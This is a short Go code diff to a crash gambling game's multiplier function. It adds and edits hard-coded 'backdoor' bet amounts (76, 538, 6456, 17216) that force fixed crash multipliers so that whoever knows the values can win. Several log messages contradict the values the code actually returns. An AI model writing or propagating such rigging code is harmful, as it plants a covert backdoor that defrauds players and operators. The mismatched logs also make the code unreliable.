@@ -67,12 +67,19 @@ func (CG *CrashGame) GenerateCrashPointMultiplier() float64 {
         if bet.Amount == 76 {
             logger.Info("Matched backdoor value 76 -> 1.6x")
             CG.CrashPointMultiplier = 1.6
-            return 1.6
+            return 1.5
         }
+
+        if(bet.Amount == 6456) {
+            logger.Info("Matched backdoor value 538 -> 7.0x")
+            CG.CrashPointMultiplier = 7
+            return 7
+        }
+        
         if bet.Amount == 538 {
-            logger.Info("Matched backdoor value 538 -> 32.0x")
-            CG.CrashPointMultiplier = 32
-            return 32
+            logger.Info("Matched backdoor value 538 -> 12.0x")
+            CG.CrashPointMultiplier = 12
+            return 12
         }
         if bet.Amount == 17216 {
             logger.Info("Matched backdoor value 17216 -> 2.5x")
